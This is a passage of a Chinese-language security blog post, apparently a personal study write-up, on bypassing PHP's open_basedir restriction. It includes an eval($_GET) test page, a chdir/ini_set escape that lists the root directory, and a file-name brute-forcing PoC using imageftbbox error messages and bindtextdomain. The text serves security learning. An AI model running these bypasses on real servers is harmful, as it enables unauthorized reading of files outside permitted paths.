+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39;&lt;br/&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">ob_flush</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">flush</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="利用chdir与ini_set" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8chdir%e4%b8%8eini_set" class="header-mark"></a>利用chdir与ini_set</h1><p>首先解释一下<strong>ini_set</strong>
+<a href="https://www.php.net/manual/zh/function.ini-set" target="_blank" rel="noopener noreferrer">https://www.php.net/manual/zh/function.ini-set</a>
+这里先放一下demo network师傅的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;open_basedir: &#39;</span><span class="o">.</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;GET: &#39;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;open_basedir: &#39;</span><span class="o">.</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>EXP:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;sub&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;sub&#39;</span><span class="p">);</span><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">);</span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一些分析：
+<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank" rel="noopener noreferrer">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a>
+好吧我实在是看不下去底层了&hellip;还是功底不够..还得练</p>
+<h1 id="gd库imageftbboximagefttext" class="headerLink">
+    <a href="#gd%e5%ba%93imageftbboximagefttext" class="header-mark"></a>GD库imageftbbox/imagefttext</h1><p>看了一下其实和前面的realpath一样都是通过一些报错来进行猜解
+当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。</p>
+<p>POC：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#34;</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">set_error_handler</span><span class="p">(</span><span class="s1">&#39;isexists&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;d:/test/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;&gt;&lt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//$m = imagecreatefrompng(&#34;zip.png&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#39;aaa&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">imageftbbox</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="s1">&#39;aaa&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isexists</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$errstr</span><span class="p">,</span> <span class="s1">&#39;Invalid font filename&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;%s&lt;br/&gt;&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="bindtextdomain暴力执法" class="headerLink">
+    <a href="#bindtextdomain%e6%9a%b4%e5%8a%9b%e6%89%a7%e6%b3%95" class="header-mark"></a>bindtextdomain暴力执法</h1><p>emm原理还是一样但是鸡肋，因为Windows下面默认没有这个函数&amp;&amp;linux下面是不能使用通配符进行绕过所以如果上面的方法都没有用才会考虑这些猜解的问题</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s1">&#39;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#39;</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$re</span> <span class="o">=</span> <span class="nx">bindtextdomain</span><span class="p">(</span><span class="s1">&#39;xxx&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="reference" class="headerLink">
+    <a href="#reference" class="header-mark"></a>reference</h1><p>1、 <a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.htm" target="_blank" rel="noopener noreferrer">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.htm</a>
+2、 <a href="https://xz.aliyun.com/t/10070?time__1311=mq%2BxBD9QDQe4RDBkPoGkYL5AKeGIhxqGOjeD" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/10070?time__1311=mq%2BxBD9QDQe4RDBkPoGkYL5AKeGIhxqGOjeD</a>
+3、 <a href="https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/" target="_blank" rel="noopener noreferrer">https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/</a>
+4、 <a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank" rel="noopener noreferrer">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-04-14</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/php/">PHP</a>,&nbsp;<a href="/tags/bypass/">bypass</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/python%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%80/" class="prev" rel="prev" title="PYTHON安全问题总结(一)"><i class="fas fa-angle-left fa-fw"></i>PYTHON安全问题总结(一)</a>
+            <a href="/posts/filter-chain-learning/" class="next" rel="next" title="Filter Chain learning">Filter Chain learning<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script></div>
+</body>
+
+</html>
